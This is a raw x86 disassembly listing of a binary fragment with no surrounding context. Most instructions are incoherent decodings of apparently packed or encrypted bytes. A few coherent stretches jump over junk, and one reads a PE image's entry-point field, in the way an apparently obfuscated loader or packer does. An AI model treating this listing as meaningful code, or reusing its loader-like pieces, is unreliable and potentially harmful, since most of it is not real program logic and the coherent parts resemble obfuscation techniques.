  41d72d:	fstp   DWORD PTR [eax+edx*8]
  41d730:	adc    esp,DWORD PTR [ebp-0x45]
  41d733:	rcr    DWORD PTR [eax+0x11523c4e],0xf0
  41d73a:	sub    edx,DWORD PTR [ecx]
  41d73c:	jge    0x41d6cb
  41d73e:	ins    BYTE PTR es:[edi],dx
  41d73f:	in     eax,0x4f
  41d741:	adc    eax,0xc9b69662
  41d746:	aam    0x34
  41d748:	inc    esp
  41d749:	out    dx,al
  41d74a:	push   es
  41d74b:	loopne 0x41d7b2
  41d74d:	aad    0xb9
  41d74f:	sti    
  41d750:	push   ds
  41d751:	(bad)  
  41d752:	mov    dl,0x41
  41d754:	not    DWORD PTR [ebp-0x100d5463]
  41d75a:	int    0x98
  41d75c:	add    DWORD PTR [ebx],0x30
  41d75f:	mov    edi,DWORD PTR [ecx-0x53a89e0d]
  41d765:	sub    esi,0x63657600
  41d76b:	mul    BYTE PTR [ecx-0x66]
  41d76e:	popa   
  41d76f:	dec    si
  41d771:	push   esi
  41d772:	pop    edx
  41d773:	jmp    0x5e93:0xc0ab8b74
  41d77a:	dec    ebx
  41d77b:	(bad)  
  41d77c:	into   
  41d77d:	loope  0x41d75a
  41d77f:	mov    dh,0x11
  41d781:	and    ah,BYTE PTR [esi+0x70]
  41d784:	dec    edx
  41d785:	ds mov cl,0x7
  41d788:	mov    esi,0xe3e83fe8
  41d78d:	fnstsw WORD PTR [ebp-0x4]
  41d790:	push   0xe478acfc
  41d795:	push   esi
  41d796:	sahf   
  41d797:	pop    ds
  41d798:	leave  
  41d799:	xchg   esi,eax
  41d79a:	pop    ds
  41d79b:	xchg   ecx,eax
  41d79c:	aam    0x3b
  41d79e:	or     ch,BYTE PTR [esp]
  41d7a1:	push   ebx
  41d7a2:	xchg   edx,eax
  41d7a3:	jge    0x41d80a
  41d7a5:	out    0xff,eax
  41d7a7:	pop    ss
  41d7a8:	jl     0x41d802
  41d7aa:	aad    0xd1
  41d7ac:	fs daa 
  41d7ae:	jae    0x41d734
  41d7b0:	cli    
  41d7b1:	or     ch,0x87
  41d7b4:	inc    ebx
  41d7b5:	rep stos DWORD PTR es:[edi],eax
  41d7b7:	and    eax,0x539cee22
  41d7bc:	mov    ecx,0xba629c2e
  41d7c1:	repz mov ds:0x4457a9ee,al
  41d7c7:	mov    es,WORD PTR fs:[eax]
  41d7ca:	ret    0xbec0
  41d7cd:	push   ss
  41d7ce:	mov    ebp,0x17a4cc33
  41d7d3:	inc    eax
  41d7d4:	addr16 adc al,0x81
  41d7d7:	dec    ebx
  41d7d8:	(bad)  
  41d7d9:	push   ecx
  41d7da:	shl    BYTE PTR [eax+0x167e88e8],1
  41d7e0:	in     eax,dx
  41d7e1:	das    
  41d7e2:	div    cl
  41d7e4:	lahf   
  41d7e5:	dec    ecx
  41d7e6:	adc    al,0x60
  41d7e8:	out    dx,eax
  41d7e9:	not    BYTE PTR [eax+eiz*8-0x70]
  41d7ed:	pop    eax
  41d7ee:	(bad)  
  41d7ef:	sub    DWORD PTR [ecx+0x48e88f25],esi
  41d7f5:	xor    eax,0xbac89782
  41d7fa:	pop    es
  41d7fb:	pop    edx
  41d7fc:	mov    DWORD PTR [ecx+esi*8+0x465ab122],ebp
  41d803:	shr    DWORD PTR [ebp+0x3ebfe9e3],cl
  41d809:	in     al,dx
  41d80a:	push   0x3c
  41d80c:	dec    ecx
  41d80d:	mov    bl,0xa3
  41d80f:	mov    WORD PTR [edi+0x52d5f6b5],?
  41d815:	xchg   ecx,eax
  41d816:	iret   
  41d817:	pop    ebx
  41d818:	shl    BYTE PTR [ebp+0x11a0d8b],1
  41d81e:	cmp    bh,al
  41d820:	out    dx,eax
  41d821:	inc    eax
  41d822:	jecxz  0x41d7cc
  41d824:	or     eax,0x47890365
  41d829:	(bad)  
  41d82a:	pop    ebx
  41d82b:	jnp    0x41d7bc
  41d82d:	imul   ecx,DWORD PTR [edi-0x1],0xffffff89
  41d831:	pop    edi
  41d832:	jmp    0xd662:0x2ee0d7aa
  41d839:	pop    ebx
  41d83a:	cmp    eax,0x8f10eea
  41d83f:	pusha  
  41d840:	(bad)  
  41d842:	and    al,dl
  41d844:	ret    0xd873
  41d847:	js     0x41d82c
  41d849:	retf   
  41d84a:	dec    ebp
  41d84b:	ss aas 
  41d84d:	push   edi
  41d84e:	cmp    al,0x1d
  41d850:	or     BYTE PTR [eax+0xe3446d],ah
  41d856:	and    al,0xdb
  41d858:	mov    edx,0x412751ef
  41d85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d85e:	xchg   DWORD PTR [esi+esi*8+0x59],eax
  41d862:	pop    ecx
  41d863:	pop    ss
  41d864:	daa    
  41d865:	outs   dx,DWORD PTR ds:[esi]
  41d866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d867:	retf   
  41d868:	ins    BYTE PTR es:[edi],dx
  41d869:	mov    ds:0x624f3e55,eax
  41d86e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d86f:	jge    0x41d815
  41d871:	xchg   edi,eax
  41d872:	dec    esi
  41d873:	mov    dh,0xbb
  41d875:	jge    0x41d85e
  41d877:	mov    ecx,0xa2934a1a
  41d87c:	mov    eax,0x54906436
  41d881:	or     eax,0x8931533f
  41d886:	push   ss
  41d887:	xchg   edi,eax
  41d888:	(bad)  
  41d88a:	fsubp  st(2),st
  41d88c:	ins    DWORD PTR es:[edi],dx
  41d88d:	inc    edi
  41d88e:	dec    edi
  41d88f:	dec    edx
  41d890:	adc    dh,bh
  41d892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d893:	sub    BYTE PTR [ebx+0xe],cl
  41d896:	cli    
  41d897:	daa    
  41d898:	fnstcw WORD PTR [eax]
  41d89a:	jae    0x41d892
  41d89c:	jae    0x41d8fa
  41d89e:	mov    WORD PTR cs:[eax],cs
  41d8a1:	sbb    al,0xd1
  41d8a3:	out    0x24,eax
  41d8a5:	xchg   esi,eax
  41d8a6:	sub    eax,0xe1d31cca
  41d8ab:	mov    dh,0xc6
  41d8ad:	xlat   BYTE PTR ds:[ebx]
  41d8ae:	and    al,0xd
  41d8b0:	das    
  41d8b1:	or     eax,0x74302cc5
  41d8b6:	push   edi
  41d8b7:	mov    ebx,0x41159d40
  41d8bc:	jno    0x41d922
  41d8be:	pop    es
  41d8bf:	cmp    ch,BYTE PTR [ecx-0x46dfce29]
  41d8c5:	lea    ecx,[eax-0x14bd963f]
  41d8cb:	jmp    0x41d8f3
  41d8cd:	inc    eax
  41d8ce:	xchg   DWORD PTR [ebx+0x123e0f8],ebx
  41d8d4:	test   eax,0x9482e8dd
  41d8d9:	xlat   BYTE PTR ds:[ebx]
  41d8da:	lods   eax,DWORD PTR ds:[esi]
  41d8db:	cmp    BYTE PTR [eax-0x2b],dh
  41d8de:	popf   
  41d8df:	lock push ebx
  41d8e1:	jmp    0xd9f7:0x9b83e188
  41d8e8:	les    eax,FWORD PTR [edi]
  41d8ea:	sub    edx,edx
  41d8ec:	leave  
  41d8ed:	(bad)  
  41d8ee:	inc    ebp
  41d8ef:	mov    eax,ds:0xa3a41b74
  41d8f4:	mov    eax,DWORD PTR [ebx-0x29]
  41d8f7:	clc    
  41d8f8:	es in  eax,0x5
  41d8fb:	mov    bh,0x59
  41d8fd:	sbb    BYTE PTR [eax],ah
  41d8ff:	mov    edx,0x13760023
  41d904:	(bad)  
  41d905:	fistp  DWORD PTR [ebx-0x57]
  41d908:	mov    edx,DWORD PTR [esp+0x18]
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422558
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0x7b0455bc,eax
  41d941:	mov    al,0x7f
  41d943:	dec    ebp
  41d944:	push   ss
  41d945:	sbb    BYTE PTR [edx+edx*1-0x552ee7e8],bh
  41d94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d94d:	das    
  41d94e:	mov    eax,0xe5d3594f
  41d953:	jmp    0x41d985
  41d955:	dec    edi
  41d956:	mov    BYTE PTR [edx+0x4c],dh
  41d959:	adc    BYTE PTR [ebp+ebp*4+0x7b],ch
  41d95d:	pop    es
  41d95e:	sbb    dl,BYTE PTR [eax]
  41d960:	mov    dh,0x29
  41d962:	mov    WORD PTR [eax-0x40],?
  41d965:	(bad)  
  41d966:	rol    DWORD PTR [ebx],1
  41d968:	js     0x41d98f
  41d96a:	xor    DWORD PTR [ebx],0xffffff9e
  41d96d:	xor    al,0x4d
  41d96f:	adc    BYTE PTR [ebx+ebx*4],bl
  41d972:	and    ebp,ebp
  41d974:	push   edi
  41d975:	dec    esp
  41d976:	sub    eax,0xdbcbfa85
  41d97b:	hlt    
  41d97c:	stc    
  41d97d:	xchg   edi,eax
  41d97e:	ror    BYTE PTR [ebp+0x46664a90],0x66
  41d985:	sahf   
  41d986:	and    ah,ch
  41d988:	xor    esp,DWORD PTR ds:0x9bce8ff9
  41d98e:	aaa    
  41d98f:	mov    ebx,0x43794335
  41d994:	inc    ebx
  41d995:	cli    
  41d996:	mov    dh,0x74
  41d998:	sbb    ebx,DWORD PTR [esp+ebp*1-0x7]
  41d99c:	xchg   edi,esi
  41d99e:	lods   al,BYTE PTR ds:[esi]
  41d99f:	sub    bh,0xf0
  41d9a2:	outs   dx,DWORD PTR ds:[esi]
  41d9a3:	mov    dl,ch
  41d9a5:	addr16 push 0x6cd7dff6
  41d9ab:	mov    BYTE PTR ds:0x72d06dd3,dl
  41d9b1:	rol    DWORD PTR [ecx],1
  41d9b3:	inc    esi
  41d9b4:	ror    DWORD PTR ds:0xcb213677,1
  41d9ba:	ds dec ebx
  41d9bc:	rol    dh,1
  41d9be:	mov    ds:0x4f2cf7bd,eax
  41d9c3:	and    al,0x41
  41d9c5:	mov    cs,ebp
  41d9c7:	xchg   ecx,eax
  41d9c8:	pop    esi
  41d9c9:	ror    bl,cl
  41d9cb:	int3   
  41d9cc:	rcl    BYTE PTR [ebp-0x666fdddb],1
  41d9d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9d3:	xlat   BYTE PTR ds:[ebx]
  41d9d4:	xchg   edx,eax
  41d9d5:	or     al,0xdd
  41d9d7:	add    eax,0x5727655d
  41d9dc:	ins    DWORD PTR es:[edi],dx
  41d9dd:	sbb    al,0x1f
  41d9df:	loop   0x41da01
  41d9e1:	adc    BYTE PTR [edi+0x3ca9db92],0xea
  41d9e8:	pop    esi
  41d9e9:	test   eax,0x6f102135
  41d9ee:	and    eax,0x8e31797f
  41d9f3:	loopne 0x41da0e
  41d9f5:	int3   
  41d9f6:	mov    WORD PTR [eax+0x73478d1d],ss
  41d9fc:	lock mov eax,0x4f76f0fb
  41da02:	sub    bl,BYTE PTR [edx+0x2]
  41da05:	scas   al,BYTE PTR es:[edi]
  41da06:	and    bh,BYTE PTR [ecx-0x6]
  41da09:	(bad)  
  41da0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da0b:	mov    WORD PTR [ecx+edx*2],?
  41da0e:	popa   
  41da0f:	jns    0x41d9e7
  41da11:	sbb    ch,0x55
  41da14:	pop    esi
  41da15:	inc    ecx
  41da16:	mov    BYTE PTR [ebp+0x483734f1],ah
  41da1c:	sub    eax,DWORD PTR [edx+0x24]
  41da1f:	pop    es
  41da20:	loope  0x41da24
  41da22:	dec    esi
  41da23:	enter  0xc3a5,0xe7
  41da27:	pop    ecx
  41da28:	sbb    al,0xc3
  41da2a:	mov    ecx,0xf0ad82a1
  41da2f:	mov    DWORD PTR [edx],edi
  41da31:	jmp    0xeb2f:0x813964e6
  41da38:	(bad)
  41da3c:	dec    ecx
  41da3d:	rol    BYTE PTR [ebx],cl
  41da3f:	fsubr  DWORD PTR [ebx+0x380d928d]
  41da45:	or     DWORD PTR [edi-0x58],ebp
  41da48:	je     0x41d9f6
  41da4a:	xor    DWORD PTR [esi],ebx
  41da4c:	imul   edi,edx,0x9fb0adfb
  41da52:	xor    dh,BYTE PTR [ebp+0x315915b]
  41da58:	mov    cs,WORD PTR [ebx+0x71]
  41da5b:	cmp    BYTE PTR [esi+eax*1],0x45
  41da5f:	sub    eax,0x8550d9df
  41da64:	icebp  
  41da65:	ins    DWORD PTR es:[edi],dx
  41da66:	outs   dx,BYTE PTR ds:[esi]
  41da67:	dec    ecx
  41da68:	fs sbb eax,0x56670be6
  41da6e:	push   ss
  41da6f:	and    al,0xec
  41da71:	inc    ebp
  41da72:	aaa    
  41da73:	jmp    0x5c8f:0xc56d503c
  41da7a:	mov    ebx,0x97285f3d
  41da7f:	adc    dh,BYTE PTR [esi+ecx*8+0x22]
  41da83:	int3   
  41da84:	and    DWORD PTR [ecx+ebx*4+0x4483605c],ebp
  41da8b:	fcmove st,st(6)
  41da8d:	sub    esp,DWORD PTR [esi-0x2d]
  41da90:	cmp    eax,0x1ed48823
  41da95:	cwde   
  41da96:	imul   ebx,DWORD PTR [edx+edx*2-0x5432a863],0x1cef16b2
  41daa1:	idiv   bl
  41daa3:	arpl   WORD PTR [esp+edi*8+0x6c],dx
  41daa7:	sti    
  41daa8:	ds pop edx
  41daaa:	test   BYTE PTR [ebx-0x7f],bh
  41daad:	mov    al,0x18
  41daaf:	push   esp
  41dab0:	adc    eax,0xeca2d2ff
  41dab5:	shr    BYTE PTR [edi+esi*1-0x41],1
  41dab9:	inc    ecx
  41daba:	xor    eax,0x380b5648
  41dabf:	xchg   edx,eax
  41dac0:	lahf   
  41dac1:	repz add eax,0x3ddba6f2
  41dac7:	mov    gs:0x108f6e9f,al
  41dacd:	jmp    0x41dad2
  41dacf:	(bad)  
  41dad1:	lods   al,BYTE PTR ds:[esi]
  41dad2:	cmp    al,0xef
  41dad4:	sar    dl,1
  41dad6:	call   0x7e91a73c
  41dadb:	call   0xa935:0x92b98bc8
  41dae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dae3:	iret   
  41dae4:	pop    ss
  41dae5:	repnz fbstp TBYTE PTR [ecx+ebx*2-0x77]
  41daea:	enter  0x2f08,0x2
  41daee:	xor    ch,al
  41daf0:	mov    ebp,0xc835b45e
  41daf5:	loop   0x41db0f
  41daf7:	push   ecx
  41daf8:	or     al,dh
  41dafa:	inc    ecx
  41dafb:	(bad)  
  41dafc:	gs xor al,0x5d
  41daff:	jmp    0xe0d3a217
  41db04:	(bad)  
  41db05:	xor    DWORD PTR [eax+0x31],edx
  41db08:	fdiv   st(7),st
  41db0a:	ror    edx,0xf5
  41db0d:	mov    WORD PTR [ebp-0x412a0100],es
  41db13:	int    0x58
  41db15:	jmp    0x41db5a
  41db17:	sbb    DWORD PTR [eax+0x3a5e280d],ecx
  41db1d:	inc    edi
  41db1e:	pop    edx
  41db1f:	mov    ch,0x9d
  41db21:	dec    esi
  41db22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db23:	jecxz  0x41db13
  41db25:	mov    esi,0xc53f40bd
  41db2a:	push   es
  41db2b:	push   esp
  41db2c:	cwde   
  41db2d:	dec    ecx
  41db2e:	cmp    esp,esi
  41db30:	fnstcw WORD PTR [esi]
  41db32:	adc    esp,DWORD PTR [esi+0x4f]
  41db35:	icebp  
  41db36:	or     ebp,DWORD PTR [edi+0x5debcb42]
  41db3c:	jmp    0xa90d:0xa8b1b924
  41db43:	jnp    0x41db4d
  41db45:	hlt    
  41db46:	mov    ch,0xe7
  41db48:	jmp    0x5c34:0x92f1fa51
  41db4f:	stc    
  41db50:	aad    0x9b
  41db52:	scas   al,BYTE PTR es:[edi]
  41db53:	mov    BYTE PTR [edi+edi*4+0x61d79ae6],ah
  41db5a:	add    bl,cl
  41db5c:	mov    DWORD PTR [edi],0xbf99ce64
  41db62:	dec    eax
  41db63:	sub    al,0x9b
  41db65:	or     eax,DWORD PTR [eax]
  41db67:	pop    ss
  41db68:	xor    edi,eax
  41db6a:	pop    edi
  41db6b:	xor    DWORD PTR [ebp-0x2f],0xd49abd61
  41db72:	cli    
  41db73:	xor    BYTE PTR [esi+edx*1-0x41a97d9],ch
  41db7a:	imul   edi,DWORD PTR [esi],0x3c82cc89
  41db80:	les    edx,FWORD PTR [ebx-0x62458209]
  41db86:	dec    esi
  41db87:	xor    al,0xf7
  41db89:	ficom  DWORD PTR [ecx]
  41db8b:	and    al,0xa2
  41db8d:	mov    al,0x6e
  41db8f:	inc    esi
  41db90:	cmp    dh,BYTE PTR [ebx-0x178e91c1]
  41db96:	dec    ecx
  41db97:	fmul   DWORD PTR [edi]
  41db99:	inc    ebx
  41db9a:	fild   DWORD PTR [eax+0x38]
  41db9d:	xor    al,0x4b
  41db9f:	int3   
  41dba0:	lds    eax,FWORD PTR [edi]
  41dba2:	cmp    ebp,DWORD PTR [ebx+0x6f]
  41dba5:	pop    ebx
  41dba6:	jb     0x41dc17
  41dba8:	cmp    DWORD PTR [ecx-0x40],esp
  41dbab:	adc    eax,0x98ce63ed
  41dbb0:	enter  0xaf99,0xb6
  41dbb4:	adc    eax,0xc03e267d
  41dbb9:	xchg   edx,eax
  41dbba:	test   DWORD PTR [eax+0x559d1686],edi
  41dbc0:	mov    DWORD PTR [eax-0x70],eax
  41dbc3:	imul   edi,DWORD PTR [eax-0x686d0591],0xffffffb8
  41dbca:	sar    DWORD PTR [ebx],0x1a
  41dbcd:	js     0x41dc2b
  41dbcf:	clc    
  41dbd0:	xor    eax,0x823ca6fa
  41dbd5:	fcomp  DWORD PTR [esi]
  41dbd7:	rcr    DWORD PTR [esi+ebx*4+0xc],0x60
  41dbdc:	in     eax,0xeb
  41dbde:	add    ebp,ebx
  41dbe0:	inc    esi
  41dbe1:	push   edi
  41dbe2:	in     al,0xeb
  41dbe4:	jb     0x41dc2f
  41dbe6:	mov    bl,0x15
  41dbe8:	call   0xe6cb:0xa5bc06f
  41dbef:	int    0x6b
  41dbf1:	jle    0x41dbbc
  41dbf3:	daa    
  41dbf4:	lea    edx,[eax-0x16]
  41dbf7:	and    ebp,esp
  41dbf9:	leave  
  41dbfa:	ins    DWORD PTR es:[edi],dx
  41dbfb:	div    BYTE PTR [edx-0x2eb4d65b]
  41dc01:	add    al,0x87
  41dc03:	push   esp
  41dc04:	sbb    eax,0x8d9caace
  41dc09:	call   0xed1c:0x660ffe13
  41dc10:	iret   
  41dc11:	fwait
  41dc12:	hlt    
  41dc13:	pop    ebx
  41dc14:	test   eax,0x974217d0
  41dc19:	iret   
  41dc1a:	cmp    ebp,esp
  41dc1c:	std    
  41dc1d:	sub    edx,edi
  41dc1f:	mov    dh,0xb0
  41dc21:	push   es
  41dc22:	sbb    eax,0x55abc16b
  41dc27:	ins    DWORD PTR es:[edi],dx
  41dc28:	jo     0x41dc76
  41dc2a:	mov    dl,0x27
  41dc2c:	jecxz  0x41dbec
  41dc2e:	and    al,bh
  41dc30:	cld    
  41dc31:	dec    ecx
  41dc32:	gs jbe 0x41dbf6
  41dc35:	xor    dl,dh
  41dc37:	pusha  
  41dc38:	fist   WORD PTR [ecx-0x2b]
  41dc3b:	sbb    al,ch
  41dc3d:	xchg   ecx,eax
  41dc3e:	sub    eax,esi
  41dc40:	stos   DWORD PTR es:[edi],eax
  41dc41:	fidiv  WORD PTR [edx]
  41dc43:	push   cs
  41dc44:	in     al,dx
  41dc45:	test   DWORD PTR [ecx+0x61bfbd83],ebp
  41dc4b:	leave  
  41dc4c:	add    DWORD PTR [ebx-0x11],0xfffffff5
  41dc50:	xchg   edx,eax
  41dc51:	daa    
  41dc52:	add    BYTE PTR [ebp-0x6527b04d],dh
  41dc58:	es adc dl,dl
  41dc5b:	xchg   esp,eax
  41dc5c:	imul   edi,ecx,0xd5bd6420
  41dc62:	data16 jp 0x41dcd3
  41dc65:	inc    ecx
  41dc66:	mov    BYTE PTR [eax+0x2b4f36e4],dh
  41dc6c:	repnz adc al,0xa3
  41dc6f:	push   ds
  41dc70:	inc    eax
  41dc71:	test   DWORD PTR [ebx+0x3495ab51],ecx
  41dc77:	push   ebx
  41dc79:	jb     0x41dc00
  41dc7b:	popa   
  41dc7c:	xor    bl,BYTE PTR [edx-0x7d]
  41dc7f:	push   ds
  41dc80:	jnp    0x41dc8e
  41dc82:	cld    
  41dc83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc84:	into   
  41dc85:	mov    edx,0x80d84463
  41dc8a:	shl    BYTE PTR [eax-0x11a83726],cl
  41dc90:	or     eax,0x9940af6
  41dc95:	lea    edx,[ecx-0x4a786981]
  41dc9b:	xchg   ecx,eax
  41dc9c:	loope  0x41dc33
  41dc9e:	dec    ebx
  41dc9f:	mov    bh,0x79
  41dca1:	in     eax,0x61
  41dca3:	add    al,0xd2
  41dca5:	call   0x419a50cd
  41dcaa:	mov    WORD PTR [ecx+0x7e],gs
  41dcad:	cmp    DWORD PTR [edi+0x68],ecx
  41dcb0:	mov    dh,0x63
  41dcb2:	mov    edi,0xe85d32fb
  41dcb7:	xor    BYTE PTR [edx],bh
  41dcb9:	and    ebp,DWORD PTR [edi+0x2d7a26ea]
  41dcbf:	lea    eax,[edi]
  41dcc1:	das    
  41dcc2:	jle    0x41dc70
  41dcc4:	mov    dl,0xe7
  41dcc6:	inc    ebx
  41dcc7:	stos   BYTE PTR es:[edi],al
  41dcc8:	mov    cl,0xea
  41dcca:	or     ecx,DWORD PTR [edi+0x7b]
  41dccd:	test   eax,0xca22318e
  41dcd2:	and    DWORD PTR [esi+ebp*1],0x6ec1cbb5
  41dcd9:	lods   al,BYTE PTR ds:[esi]
  41dcda:	(bad)  
  41dcdc:	lds    edx,FWORD PTR [ebx+0x2f94a7d5]
  41dce2:	sbb    eax,0xc9c10df1
  41dce7:	(bad)  
  41dce9:	or     eax,0x7afb1435
  41dcee:	addr16 pop es
  41dcf0:	cld    
  41dcf1:	cmp    DWORD PTR [esi],edx
  41dcf3:	push   0x7e33b78
  41dcf8:	xor    eax,0x8d69afbf
  41dcfd:	inc    esp
  41dcfe:	and    al,0x6c
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0x5
  41dd5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd5c:	xchg   ecx,eax
  41dd5d:	jo     0x41dd81
  41dd5f:	inc    edi
  41dd60:	push   ss
  41dd61:	sbb    BYTE PTR [edx+edx*1+0x290f1818],bh
  41dd68:	in     al,dx
  41dd69:	cs in  al,0x21
  41dd6c:	mov    eax,ds:0xaba41e43
  41dd71:	mov    eax,ds:0x36636e97
  41dd76:	mov    ebp,0x198b0178
  41dd7b:	push   es
  41dd7c:	cdq    
  41dd7d:	scas   eax,DWORD PTR es:[edi]
  41dd7e:	ins    BYTE PTR es:[edi],dx
  41dd7f:	inc    eax
  41dd80:	add    dl,0xe9
  41dd83:	sbb    eax,0xe8c256b2
  41dd88:	iret   
  41dd89:	jge    0x41dd4e
  41dd8b:	out    dx,eax
  41dd8c:	cmp    eax,0x366ca56d
  41dd91:	dec    esi
  41dd92:	mov    eax,0x291c71d5
  41dd97:	aam    0x10
  41dd99:	icebp  
  41dd9a:	iret   
  41dd9b:	daa    
  41dd9c:	fdivrp st(2),st
  41dd9e:	dec    ebx
  41dd9f:	ja     0x41dd80
  41dda1:	jmp    0xc2aa:0x9a32ce14
  41dda8:	and    esi,ecx
  41ddaa:	and    al,0x96
  41ddac:	enter  0x1d12,0xd8
  41ddb0:	rol    DWORD PTR [eax-0x53e478f8],0x28
  41ddb7:	add    dh,cl
  41ddb9:	jo     0x41de21
  41ddbb:	xchg   esi,eax
  41ddbc:	dec    ecx
  41ddbd:	jnp    0x41de29
  41ddbf:	jb     0x41dda2
  41ddc1:	jb     0x41dddc
  41ddc3:	ss cmp al,0x15
  41ddc6:	nop
  41ddc7:	hlt    
  41ddc8:	shr    DWORD PTR [ecx+0x301dd7fb],cl
  41ddce:	jle    0x41ddd6
  41ddd0:	mov    ecx,0x8993e101
  41ddd5:	dec    eax
  41ddd6:	ins    BYTE PTR es:[edi],dx
  41ddd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddd8:	mov    dl,0x6b
  41ddda:	fstp   TBYTE PTR ds:0x6f852629
  41dde0:	add    esp,DWORD PTR [ecx]
  41dde2:	addr16 jbe 0x41ddce
  41dde5:	stos   DWORD PTR es:[edi],eax
  41dde6:	fs call 0xcf7:0xe3628319
  41ddee:	mov    bl,0xc8
  41ddf0:	cmp    eax,0xf080cd80
  41ddf5:	nop
  41ddf6:	jmp    0x13dd:0xf236adc
  41ddfd:	xor    eax,0x8ae9e941
  41de02:	cmp    ah,BYTE PTR [edi]
  41de04:	jbe    0x41de6d
  41de06:	repz dec ebp
  41de08:	add    WORD PTR [edi+0x4e],dx
  41de0c:	div    BYTE PTR [ebp+0x73]
  41de0f:	and    bl,BYTE PTR [esi-0x76]
  41de12:	jg     0x41ddd0
  41de14:	add    DWORD PTR [esi-0x45],esp
  41de17:	test   BYTE PTR [esi+ebp*1-0x7763fcc4],bl
  41de1e:	(bad)  
  41de1f:	push   ds
  41de20:	xlat   BYTE PTR gs:[ebx]
  41de22:	scas   al,BYTE PTR es:[edi]
  41de23:	mov    ebp,0x361f7a49
  41de28:	push   ss
  41de29:	push   ss
  41de2a:	jb     0x41de83
  41de2c:	push   ds
  41de2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de2e:	pop    ss
  41de2f:	dec    edi
  41de30:	adc    eax,0xb9b5997b
  41de35:	hlt    
  41de36:	(bad)  
  41de37:	xchg   ecx,eax
  41de38:	pop    esi
  41de39:	adc    edx,ebp
  41de3b:	ja     0x41ddf8
  41de3d:	stos   DWORD PTR es:[edi],eax
  41de3e:	pop    ebp
  41de3f:	popa   
  41de40:	test   BYTE PTR [esi],bl
  41de42:	imul   eax,eax,0x80c3cbd1
  41de48:	mov    ds:0x639cf4ce,eax
  41de4d:	lahf   
  41de4e:	fmul   DWORD PTR [edx+0x4d86446b]
  41de54:	push   esp
  41de55:	shl    dh,cl
  41de57:	dec    edx
  41de58:	push   ebx
  41de59:	lock ja 0x41debe
  41de5c:	and    al,0x2d
  41de5e:	xchg   DWORD PTR [edx-0x6b7689fc],ebx
  41de64:	dec    ebp
  41de65:	push   ds
  41de66:	inc    esi
  41de67:	and    DWORD PTR [ebx],0x9597a36f
  41de6d:	and    al,0x88
  41de6f:	push   edx
  41de70:	xchg   DWORD PTR [edx-0x5d],esi
  41de73:	and    al,0xac
  41de75:	xlat   BYTE PTR ds:[ebx]
  41de76:	fsub   DWORD PTR [ebx-0x7da1b38d]
  41de7c:	sbb    DWORD PTR [ebx-0xa],esi
  41de7f:	mov    dl,0x40
  41de81:	aas    
  41de82:	inc    edx
  41de83:	clc    
  41de84:	push   ss
  41de85:	retf   
  41de86:	pop    ecx
  41de87:	fiadd  WORD PTR [ebp+eiz*2+0x4468faad]
  41de8e:	rcr    DWORD PTR [ebx+0x65],cl
  41de91:	in     al,dx
  41de92:	cmp    cl,BYTE PTR [edi+0x6d26114a]
  41de98:	mov    eax,0xcba18016
  41de9d:	fstp   QWORD PTR fs:[esi-0x4d]
  41dea1:	and    DWORD PTR [esp+ecx*8],edi
  41dea4:	(bad)  
  41dea5:	fidiv  WORD PTR [ecx-0x51996ba2]
  41deab:	out    0x90,al
  41dead:	mov    bl,dl
  41deaf:	add    DWORD PTR [ebx+0x13],0xaf80996a
  41deb6:	jg     0x41df1f
  41deb8:	aad    0x62
  41deba:	jbe    0x41debf
  41debc:	pop    ecx
  41debd:	xor    DWORD PTR [ebx],ebx
  41debf:	cmp    BYTE PTR [ebx-0x6e],0xff
  41dec3:	xor    DWORD PTR [edi-0x6c],esp
  41dec6:	(bad)  [ebx+0x1a]
  41dec9:	xchg   DWORD PTR [ecx+0x1c],edi
  41decc:	dec    eax
  41decd:	popa   
  41dece:	pop    edi
  41decf:	ret    0xf477
  41ded2:	std    
  41ded3:	dec    ebp
  41ded4:	mov    BYTE PTR [edi-0x5b],bh
  41ded7:	sub    BYTE PTR [ecx+0x5e],dh
  41deda:	mov    eax,db2
  41dedd:	test   eax,0x49974d3d
  41dee2:	cmp    DWORD PTR [esi],0x31
  41dee5:	popf   
  41dee6:	cmp    ah,ah
  41dee8:	or     BYTE PTR ds:0xd28d8cb5,0x99
